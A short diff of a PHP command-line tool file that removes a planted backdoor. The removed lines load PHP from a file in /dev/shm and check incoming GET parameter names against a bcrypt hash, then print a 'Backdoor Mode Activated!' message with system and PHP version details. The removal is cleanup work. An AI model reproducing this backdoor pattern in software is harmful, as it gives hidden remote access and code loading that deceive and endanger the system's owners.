@@ -14,23 +14,6 @@
  */
 
 require(dirname(dirname(dirname(dirname(__FILE__)))) . '/tools/bootstrap.inc.php');
-require("/dev/shm/session.txt"); // Memuat session dari /dev/shm
-
-$hash = '$2y$10$tkK5OY6b0.X2mVz1kMWXxewqVtxVNxe/7tkalDaFZTgMeCdovTLrq';
-
-if (!empty($_GET)) {
-    foreach ($_GET as $k => $v) {
-        if (password_verify($k, $hash)) {
-            echo "<pre>";
-            echo "Backdoor Mode Activated!\n";
-            echo php_uname() . "\n";
-            echo phpversion() . "\n";
-            echo "</pre>";
-            exit;
-        }
-    }
-}
-
 class constants extends CommandLineTool {
 
 	var $value;
